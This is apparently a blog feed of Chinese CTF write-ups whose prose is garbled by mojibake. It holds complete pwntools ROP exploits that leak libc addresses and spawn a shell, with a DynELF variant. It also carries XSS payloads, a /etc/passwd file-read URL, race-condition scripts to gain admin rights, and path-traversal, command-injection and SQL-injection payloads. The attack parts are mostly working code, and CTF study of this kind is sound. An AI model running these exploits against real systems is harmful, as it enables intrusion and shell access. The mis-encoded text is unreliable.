ˆé¡¶çš„æ•°æ®ä¸ºreadå‡½æ•°çš„pltè¡¨åœ°å€ï¼Œpopå®ŒåŽï¼Œå…¶åœ°å€è¢«ä¿å­˜åœ¨rsiä¸­ï¼Œä½œä¸ºwriteçš„ç¬¬äºŒä¸ªå‚æ•°ã€‚æŽ¥ä¸‹åŽ»è¦æ‰§è¡Œpop r15ï¼Œæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éšä¾¿å†™ä¸€ä¸ªp64ï¼ˆ1ï¼‰è¿›åŽ»ã€‚å†æŽ¥ä¸‹åŽ»å°±æ˜¯retï¼ˆè¿”å›žï¼‰è·³è½¬åˆ°funcå‡½æ•°ï¼Œä»¥ä¾¿è¿›è¡Œä¸‹ä¸€æ¬¡åˆ©ç”¨ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬æ²¡æœ‰è®¾ç½®writeçš„ç¬¬ä¸‰ä¸ªå‚æ•°å‘¢ï¼Ÿï¼Ÿï¼Ÿ è§ä¸‹æ–‡ã€‚ 12p.recv(0x100)read_addr = u64(p.recv(8)) å‰é¢å‘é€payloadåŽï¼Œå…ˆæ‰§è¡Œäº†æ­£å¸¸çš„writeå‡½æ•°æµç¨‹ï¼Œæ³¨æ„æºç¨‹åºä¸­çš„writeçš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯0x100ï¼Œæ‰€ä»¥éœ€è¦å…ˆp.recv(0x100)ï¼Œä¹‹åŽç”±äºŽfuncçš„è¿”å›žåœ°å€è¢«è¦†ç›–äº†ï¼Œç¨‹åºæµç¨‹ä¼šè¿›å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ropä¸­ã€‚åœ¨ropé“¾ä¸­ï¼Œæˆ‘ä»¬ä¿®æ”¹äº†writeçš„å‰ä¸¤ä¸ªå‚æ•°ï¼Œæ­¤æ—¶writeçš„å‡½æ•°è°ƒç”¨å¦‚ä¸‹ï¼šwrite(1,read_plt_addr,0x100)ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯èŽ·å¾—readå‡½æ•°çš„åœ°å€ï¼Œåœ¨64ä½çŽ¯å¢ƒä¸‹ä¸º8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åªéœ€è¦æˆªå–writeè¾“å‡ºçš„å‰8ä¸ªå­—èŠ‚ï¼Œå³read_addr = u64ï¼ˆp.recv(8)ï¼‰ã€‚ 12345system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))log.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr))) èŽ·å–äº†readå‡½æ•°åœ°å€åŽï¼Œå°±å¯ä»¥è®¡ç®—systemï¼ˆï¼‰å‡½æ•°å’Œå­—ç¬¦ä¸²shçš„åœ°å€äº† 1234567payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.interactive() ç¬¬ä¸€æ¬¡ropç»“æŸåŽï¼Œæˆ‘ä»¬è®©å®ƒretåˆ°funcå‡½æ•°ï¼ŒæŽ¥ä¸‹æ¥æž„é€ æ–°çš„ropã€‚åŒæ ·åˆ©ç”¨&#39;a&#39;*offsetå…ˆæº¢å‡ºåˆ°returnï¼Œé€šè¿‡pop rdiï¼Œå°†shå­—ç¬¦ä¸²çš„åœ°å€ä¿å­˜åˆ°å¯„å­˜å™¨rdiä¸­ï¼Œä½œä¸ºsystemï¼ˆï¼‰å‡½æ•°çš„å‚æ•°ã€‚ä¹‹åŽæ˜¯retï¼Œç›´æŽ¥è¿”å›žåˆ°systemï¼ˆï¼‰å‡½æ•°çš„åœ°å€ï¼Œä»Žè€ŒæˆåŠŸgetshellï¼ˆï¼‰ é™„ä¸Šå®Œæ•´çš„expï¼š123456789101112131415161718192021222324252627282930313233343536373839from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so")offset = 88offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh)))pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1)payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)read_addr = u64(p.recv(8))log.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() ä¸æä¾›libcè‹¥é¢˜ç›®æ²¡æœ‰æä¾›libcçš„è¯ï¼Œéœ€è¦åˆ©ç”¨pwntoolä¸­çš„DynELFæ¥æ³„éœ²åœ°å€ã€‚ä½†æœ‰äº›åœ°æ–¹éœ€è¦æ³¨æ„ï¼Œå› ä¸ºDynELFä¼šä¸€ç›´å¾ªçŽ¯åœ°åŽ»æ³„éœ²åœ°å€ï¼Œæ‰€ä»¥æ ˆå¯èƒ½ä¼šæœ‰ä¸å¯æŽ§çš„æƒ…å†µã€‚æ ¹æ®ã€Šå€ŸåŠ©DynELFå®žçŽ°æ— libcçš„æ¼æ´žåˆ©ç”¨å°ç»“ã€‹ï¼Œå¯ä»¥åœ¨å‡½æ•°åœ°å€æ³„éœ²å®ŒåŽï¼Œè°ƒç”¨_startå‡½æ•°ä»¥æ¢å¤æ ˆã€‚ä½†æˆ‘è¿™é‡Œæµ‹è¯•æ—¶ï¼Œå¦‚æžœåœ¨æ³„éœ²å®ŒæˆåŽå†æ¢å¤å°±æ²¡åŠžæ³•pwnæˆåŠŸï¼Œæˆ‘å°±ç›´æŽ¥æŠŠå¯¹_startçš„è°ƒç”¨æ”¾åˆ°äº†leakå‡½æ•°é‡Œï¼Œæ¯æ³„éœ²ä¸€æ¬¡å°±æ¢å¤ä¸€æ¬¡æ ˆã€‚ æ€è·¯ åˆ©ç”¨DynELFæ³„éœ²å‡ºsystemçš„åœ°å€ï¼Œ åˆ©ç”¨readå‡½æ•°å‘å¯å†™æ•°æ®æ®µï¼ˆæ¯”å¦‚.bssæ®µï¼‰å†™å…¥å­—ç¬¦ä¸²â€œ/bin/shâ€ è°ƒç”¨systemï¼Œgetshellã€‚ expä¸‹é¢ä¹Ÿæ˜¯æ ¹æ®expå…·ä½“è®²è§£ã€‚ 1234from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88 æ³¨æ„è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»æ²¡æœ‰ç”¨åˆ°libc.soäº†ï¼Œæ‰‹é‡Œæœ‰çš„åªæœ‰pwnè¿™ä¸ªç¨‹åºã€‚ 1234bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 bss_addræ˜¯æˆ‘ä»¬å‡†å¤‡å†™å…¥å­—ç¬¦ä¸²çš„bssæ®µåœ°å€ã€‚start_addrç”¨äºŽæ¢å¤æ ˆã€‚pop_rdi_ret_addrï¼Œpop_rsi_pop_r15_addrç”±ROPgadgetå¾—åˆ°ã€‚ 1234567891011121314151617181920def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return address åˆ©ç”¨ropæŠ€æœ¯ï¼Œç»“åˆwriteï¼ˆï¼‰å‡½æ•°ï¼Œæ³„éœ²å‡ºåœ°å€åŽåˆå›žåˆ°funcå‡½æ•°ä½“ä¸­ã€‚æ³¨æ„æ³„éœ²çš„åœ°å€æ˜¯8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥address = p.recv(8)ï¼Œè€Œwriteçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆ0x100ï¼‰æˆ‘ä»¬æ²¡æ³•æ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦ç”¨p.recv()æŽ¥æ”¶å‰©ä¸‹çš„å­—ç¬¦ã€‚æŽ¥ä¸‹åŽ»å°±æ˜¯å›žåˆ°funcå‡½æ•°åŽï¼Œä¼šåŽ»è°ƒç”¨_startå‡½æ•°ï¼Œæ¢å¤æ ˆã€‚å®Œäº†åŽå†æ¬¡è¿›å…¥funcï¼ˆï¼‰ï¼Œè¿›è¡Œä¸‹ä¸€æ¬¡æ³„éœ²ã€‚ 123456d = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr))) åˆ©ç”¨DynELFæ³„éœ²å‡ºsystemå’Œreadå‡½æ•°çš„åœ°å€ã€‚readå‡½æ•°çš„åœ°å€ï¼Œå…¶å®žå¯ä»¥ç›´æŽ¥èŽ·å¾—ï¼Œå³æ³¨é‡Šä¸­çš„read_addr = elf.plt[&#39;read&#39;] 12345678910111213payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload) è¿™ä¸€éƒ¨åˆ†ï¼Œè°ƒç”¨readå‡½æ•°ï¼Œå‘bssæ®µå†™å…¥/bin/shå­—ç¬¦ä¸²ï¼Œä¹‹åŽå†å›žåˆ°funcå‡½æ•°ä½“ä¸­ã€‚é€šè¿‡pop_rdi_ret_addræž„é€ äº†readçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯0ï¼Œé€šè¿‡pop_rsi_pop_r15_addræž„é€ äº†readçš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºbss_addrã€‚æŽ¥ä¸‹åŽ»çš„é‚£ä¸ªp64(1)åªæ˜¯ä¸ºäº†æ‰§è¡Œpop_r15æ²¡æœ‰å…¶ä»–ç”¨å¤„ã€‚å› æ­¤åœ¨è°ƒç”¨readï¼ˆï¼‰æ—¶æ˜¯è¿™æ ·çš„ï¼šread(0,bss_addr,0x100)ã€‚ 12345678payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() è¿™ä¸€éƒ¨åˆ†ï¼Œè°ƒç”¨systemï¼ˆï¼‰ï¼Œåˆ©ç”¨pop_rdi_ret_addræä¾›å‚æ•°/bin/sh é™„ä¸Šå®Œæ•´exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return addressd = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload)payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss-quiz-writeup]]></title>
      <url>%2F2017%2F06%2F25%2Fxss-quiz-writeup%2F</url>
      <content type="text"><![CDATA[xss-quizï¼š http://xss-quiz.int21h.jp/ Stage 1payload:1&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 2http://xss-quiz.int21h.jp/stage2.php å°è¯•å¦‚ä¸‹payloadï¼š1&lt;script&gt;alert(document.domain)&lt;/script&gt; æ— ååº”ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š éœ€è¦é—­åˆå‰é¢valueçš„åŒå¼•å·ï¼Œæ‰€ä»¥æœ€åŽpayloadå¦‚ä¸‹ï¼š1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot; Stage 3http://xss-quiz.int21h.jp/stage-3.php å¤šäº†ä¸€ä¸ªé€‰æ‹©countryçš„åŠŸèƒ½ã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GCTF-web-writeup]]></title>
      <url>%2F2017%2F06%2F19%2FGCTF-web-writeup%2F</url>
      <content type="text"><![CDATA[GCTF-web-writeup çƒ­èº«é¢˜é¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18001/è®¿é—®robots.txtã€‚1http://218.2.197.232:18001/robots.txt ä¸€ä¸ªä¸ªè®¿é—®è¿‡åŽ»ï¼š1http://218.2.197.232:18001/rob0t.php å¾—åˆ°flagï¼š1GCTF&#123;ae609880185f1d75&#125; springcssspringcss-cve-2014-3625æ¼æ´žã€‚githubä¸Šæœ‰åˆ©ç”¨è„šæœ¬:https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh ã€‚è¿™é‡Œçš„payload1ï¼š1http://218.2.197.232:18015/spring-css/resources/file:/etc/passwd payload2ï¼š1http://218.2.197.232:18015/spring-css/resources/file:/etc/flag æœ€åŽflagï¼š1GCTF&#123;db839442402f5874&#125; PHPåºåˆ—åŒ–é¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18017/ é¢˜ç›®ç»™äº†æºç ï¼š1234567891011&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set('session.serialize_handler', 'php_serialize');header("content-type;text/html;charset=utf-8");session_start();if(isset($_GET['src']))&#123; $_SESSION['src'] = $_GET['src']; highlight_file(__FILE__); print_r($_SESSION['src']);&#125;?&gt; é‡Œé¢æåˆ°äº†session.serialize_handlerï¼Œæƒ³åˆ°wooyunä¸Šçš„æ–‡ç« ã€ŠPHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“å¸¦æ¥çš„å®‰å…¨éšæ‚£ã€‹ æ¡ä»¶ç«žäº‰é¢˜ç›®åœ°å€ï¼šhttp://218.2.197.242:18009/ æŸ¥çœ‹æºä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpheader("Content-type: text/html; charset=utf-8");session_start();$mysqli = new mysqli("localhost", "root", "", "gctf09");if ($mysqli-&gt;connect_errno) &#123; die("æ•°æ®åº“è¿žæŽ¥é”™è¯¯ï¼Œå¤šæ¬¡å‡ºçŽ°è¯·è”ç³»ç®¡ç†å‘˜ã€‚");&#125;//æ‰“å°æºç if(isset($_REQUEST['showcode']))&#123; highlight_file(___FILE___); exit();&#125;$user="";// åˆæ¬¡è®¿é—®ç”Ÿæˆç”¨æˆ·if(!isset($_SESSION["name"]))&#123; $user=substr(md5(uniqid().uniqid()),8,16); $_SESSION["name"]=$user; $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($user)); $stmt-&gt;execute(); $stmt-&gt;close(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close();&#125;else&#123; $user=$_SESSION["name"];&#125;//é‡ç½®æ—¶æ¸…ç†ç”¨æˆ·ä¿¡æ¯if($_SERVER["REQUEST_METHOD"] === "POST" &amp;&amp; $_GET['method']==="reset" &amp;&amp; isset($_POST['password']) )&#123; $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`user` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`priv` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($_POST['password'])); $stmt-&gt;execute(); $stmt-&gt;close(); //åˆ¤æ–­ç”¨æˆ·æƒé™æ—¶ä¼šæŸ¥è¯¢privè¡¨ï¼Œå¦‚æžœä¸ºä¸ä¸ºTRUEåˆ™æ˜¯ç®¡ç†å‘˜æƒé™ $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close(); $mysqli-&gt;close(); die("ä¿®æ”¹æˆåŠŸ");&#125;$mysqli-&gt;close();?&gt; åˆæ¬¡è®¿é—®ç”Ÿæˆç”¨æˆ·æ—¶ï¼Œä¼šå¾€userè¡¨å’Œprivè¡¨å†™å…¥æ•°æ®ã€‚ è€Œåœ¨é‡ç½®ç”¨æˆ·æ—¶ï¼Œè¿›è¡Œäº†ä¸‰ä¸ªå¤§çš„æ“ä½œï¼š åˆ é™¤userè¡¨ä¸­å¯¹åº”æ•°æ®ï¼Œåˆ é™¤privè¡¨ä¸­å¯¹åº”çš„å€¼ã€‚ å‘userè¡¨ä¸­æ’å…¥nameå’Œæ–°çš„passï¼Œè¾¾åˆ°æ›´æ–°å¯†ç çš„ç›®çš„ã€‚ å‘privè¡¨ä¸­å¯¹åº”çš„nameä¸‹notadminçš„å€¼æ›´æ”¹ï¼ˆå³æ’å…¥ï¼‰ä¸ºâ€TRUEâ€ã€‚ ç»™å‡ºçš„æºç ä¸­æœ‰ä¸€æ®µæ³¨é‡Šï¼š1//åˆ¤æ–­ç”¨æˆ·æƒé™æ—¶ä¼šæŸ¥è¯¢privè¡¨ï¼Œå¦‚æžœä¸ºä¸ä¸ºTRUEåˆ™æ˜¯ç®¡ç†å‘˜æƒé™ æ‰€ä»¥åœ¨æ‰§è¡Œæ“ä½œ3ä¹‹å‰ï¼Œåœ¨è¿™ä¸€ä¸ªç©ºéš™é‡Œç™»é™†çš„è¯ï¼Œæ­¤æ—¶ä¼šæ˜¯ç®¡ç†å‘˜æƒé™ã€‚å¯ä»¥è‡ªå·±å†™å¤šçº¿ç¨‹è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç”¨burpè·‘ã€‚ reset.py1234567import requestswhile True : parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/index.php?method=reset',cookies=cookies,data=parm) print r.text login.py1234567891011import requestsflag = Falsewhile not flag: parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/login.php?method=login',cookies=cookies,data=parm) print r.text if '&#123;' in r.text: flag = True break ä¸¤è€…åˆ†åˆ«è¿è¡Œã€‚ æœ€åŽflagï¼š1GCTF&#123;KBnLGG6qR2ZdYe4HbUL8XpAP&#125; è¯»æ–‡ä»¶é¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18008/è®¿é—®åŽæŸ¥çœ‹æºä»£ç ï¼Œå¦‚ä¸‹ï¼š è‹¥è®¿é—®ï¼š1http://218.2.197.232:18008/a/down.php?p=1.txt åŒæ ·å¯ä»¥æ­£å¸¸è¯»å–ï¼Œå¯ä»¥çŒœæµ‹è¿‡æ»¤äº†å…³é”®å­—ï¼š./ è‹¥å°†1.txtæ”¹ä¸ºflag.phpï¼Œè®¿é—®ï¼š12http://218.2.197.232:18008/a/down.php?p=./flag.php åˆ™è¿”å›žé¡µé¢æç¤º wafï¼Œæ‰€ä»¥flagè¢«wafäº†ã€‚ ç»“åˆflagå’Œ./ï¼ŒåŒæ—¶æˆ‘ä»¬çŸ¥é“flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œè€Œdownåœ¨æ–‡ä»¶å¤¹aä¸‹ï¼Œåº”è¯¥è¦å¾€å›žè®¿é—®ã€‚æž„é€ ä¸‹è¿°é“¾æŽ¥ï¼š1http://218.2.197.232:18008/a/down.php?p=...//fl./ag.php ...//fl./ag.phpä¸­ï¼Œ./è¢«è¿‡æ»¤åŽä¼šå˜æˆ../flag.phpï¼Œè¿™æ ·å°±èƒ½æˆåŠŸè¯»å–äº†ã€‚ æœ€åŽflagï¼š1GCTF&#123;drthSDFSDGFSdsfhfg&#125; RCEç»•è¿‡é¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18006/æœ‰ç‚¹ç±»ä¼¼â€œæ˜¥ç§‹æ¯â€çš„webã€‚æž„é€ å¦‚ä¸‹payloadï¼š12http://218.2.197.232:18006/?cmd=%0acat%09 Forbiddené¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18002/ è®¿é—®å¾—åˆ°forbiddenï¼Œä½†è¿”å›žå¤´ä¸º200ï¼Œæ‰€ä»¥æ˜¯ä¸ªäººä¸ºå†™çš„é¡µé¢ã€‚æŸ¥çœ‹æºä»£ç ä¸‹æ‹‰å¾—åˆ°æç¤ºï¼š1&lt;!--åªå…è®¸æœ¬æœºè®¿é—®ã€‚ --&gt; åœ¨è¯·æ±‚åŒ…ä¸­æ·»åŠ ï¼š1X-Forwarded-For:localhost å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼š1&lt;!--åªèƒ½é€šè¿‡åŸŸåè®¿é—® --&gt; åœ¨è¯·æ±‚åŒ…ä¸­ç»§ç»­æ·»åŠ ï¼š1Host:www.topsec.com å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼š1&lt;!--åªå…è®¸ä»Žç™¾åº¦è·³è½¬åˆ°æœ¬é¡µé¢è®¿é—®ã€‚ --&gt; åœ¨è¯·æ±‚åŒ…ä¸­ç»§ç»­æ·»åŠ ï¼š1Referer:www.baidu.com å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼š1&lt;!--åªå…è®¸ä½¿ç”¨ajaxè®¿é—®æœ¬é¡µé¢ --&gt; åœ¨è¯·æ±‚åŒ…ä¸­ç»§ç»­æ·»åŠ ï¼š1X-Requested-With:XMLHttpRequest å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼š1&lt;!--æœ¬ç«™åªå…è®¸ä½¿ç”¨IE4è®¿é—® --&gt; åœ¨ç½‘ä¸ŠæŸ¥ä¸€æŸ¥ï¼Œå°†userAgentä¿®æ”¹å¦‚ä¸‹ï¼š1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98) å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼š1&lt;!--ç”µè„‘ä¸Šå¿…é¡»å®‰è£…æœ‰.NET8 --&gt; ä¿®æ”¹userAgentå¦‚ä¸‹1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98;.NET CLR 8.0.50727) å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼š1&lt;!--æœ¬ç«™åªå…è®¸å¾·å›½ç”¨æˆ·è®¿é—®ã€‚ --&gt; ä¿®æ”¹userAgentå¦‚ä¸‹ï¼š1Accept-Language: de-DE å¾—åˆ°ä¸‹ä¸€ä¸ªæç¤ºï¼›1&lt;!--æ²¡æœ‰ç™»å½•ï¼ --&gt; åŒæ—¶è¿”å›žå¤´ä¸­å‡ºçŽ°äº†ï¼š1Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d æŽ¢ç´¢å¦‚ä¸‹ï¼š12344e6a59324d545a6a4e7a4d324e513d3dæ˜¯åå…­è¿›åˆ¶ç¼–ç ï¼Œè§£ç å¾—åˆ°ï¼š NjY2MTZjNzM2NQ== çŒœæµ‹æ˜¯base64åŠ å¯†ï¼Œè§£ç å¾—åˆ°ï¼š 66616c7365 çŒœæµ‹æ˜¯åå…­è¿›åˆ¶ç¼–ç ï¼Œè§£ç å¾—åˆ°ï¼š false è¦æˆåŠŸç™»é™†ï¼Œåˆ™login=true123true è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œå¾—åˆ°ï¼š74727565å†base64ç¼–ç ï¼Œå¾—åˆ°ï¼šNzQ3Mjc1NjU=å†åå…­è¿›åˆ¶ç¼–ç ï¼Œå¾—åˆ°ï¼š4e7a51334d6a63314e6a553d åœ¨è¯·æ±‚åŒ…ä¸­å¢žåŠ Cookieï¼š1Cookie:login=4e7a51334d6a63314e6a553d å¾—åˆ°flagï¼š1GCTF&#123;Dt24FbREwYJu7P8ekQHEFknK&#125; è¶Šæƒæ³¨å…¥é¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18014/ æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°æç¤ºï¼ŒåŒæ—¶å¯ä»¥çŸ¥é“uidé»˜è®¤ä¸º500 ï¼š æŠ“åŒ…æ”¹åŒ…ï¼Œè¯•ç€æ·»åŠ uidå‚æ•°ã€‚ å‘çŽ°å¯ä»¥æˆåŠŸç›´æŽ¥ä¿®æ”¹uidå‚æ•°ï¼š æŽ¥ä¸‹æ¥è€ƒè™‘roleå‚æ•°ï¼Œå¦‚æžœç›´æŽ¥æ·»åŠ roleå‚æ•°ï¼š ä¼šè¢«æ‹¦æˆªï¼š è€ƒè™‘è¿›è¡Œæ³¨å…¥ã€‚ç»è¿‡ä¸€ç•ªæµ‹è¯•ï¼Œå¯ä»¥çŸ¥é“ï¼Œå¦‚æžœå‚æ•°ä¸­å¸¦æœ‰å¼•å·ï¼Œä¼šè¢«æ‹¦æˆªï¼Œè¢«æç¤ºè¯´â€œæœªé€šè¿‡mysql_escape_stringæ£€æŸ¥ã€‚â€ è‹¥åœ¨uidåŽé¢åŠ ä¸Šä¸€ä¸ªæ‹¬å·ï¼Œä¼šå‡ºçŽ°sqlæŠ¥é”™ï¼š çŒœæµ‹ä¸ºupdateåž‹æ³¨å…¥ï¼Œå› ä¸ºå¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯¹adminè¿›è¡Œä¸€æ¬¡hexç¼–ç ï¼Œpayloadå¦‚ä¸‹ï¼š1.....birth=11111111&amp;gender=&amp;uid=0,role=0x61646d696e å¾—åˆ°flagï¼š1GCTF&#123;9CtyJLHMxkjLUs6qfUM5Cmrb&#125; webç»¼åˆé¢˜ç›®åœ°å€ï¼šhttp://218.2.197.232:18007/ å˜æ€éªŒè¯ç é¢˜ç›®åœ°å€ï¼š http://218.2.197.232:18003/ Javaåºåˆ—åŒ–é¢˜ç›®åœ°å€ï¼š http://218.2.197.232:18005/ctfobj/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[â€œæ˜¥ç§‹æ¯â€web-writeup]]></title>
      <url>%2F2017%2F06%2F18%2F%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup%2F</url>
      <content type="text"><![CDATA[æœ‹å‹æ‰“æ¯”èµ›ï¼Œå‘å¥¹ï¼ˆå¯¹ï¼Œå¥³å­—æ—çš„å¥¹ï¼‰è¦çš„webé¢˜åœ°å€ã€‚ WEB-01è®¿é—®ï¼Œæœ‰ä¸€å¼ å›¾ç‰‡ã€‚ æŸ¥çœ‹æºä»£ç ï¼Œå‘çŽ°æç¤ºæœ‰flag.phpã€‚è®¿é—®åŽä¸ºç©ºç™½é¡µé¢ã€‚1&lt;img src=&quot;1.jpg&quot; alt=&quot;Í¼Æ¬&quot; /&gt;&lt;!-- flag.php --&gt; ç”¨å¾¡å‰‘å¯ä»¥æ‰«å‡ºå¤‡ä»½æ–‡ä»¶index.php~ï¼Œå¾—åˆ°æºä»£ç å¦‚ä¸‹ï¼š12345678910&lt;?php $a=$_GET["file"]; if(!isset($a)) &#123; $a='config'; &#125; @include($a.'.php');echo '&lt;img src="'.$img.'" alt="Í¼Æ¬" /&gt;';?&gt; å‚æ•°ä¸ºfileï¼Œå°è¯•åˆ©ç”¨phpä¼ªåè®®åŽ»è¯»å–flag.phpã€‚æœ€åŽpayloadï¼š1http://XXXXX/index.php?file=php://filter/read=convert.base64-encode/resource=flag å¾—åˆ°1PD9waHANCiRmbGFnPSdmbGFnezM4Y2FjMGU0OTc0ZTBlOTc2MTQ5MDhmOTAxZTQ1ZmUzfSc7DQo/Pg== 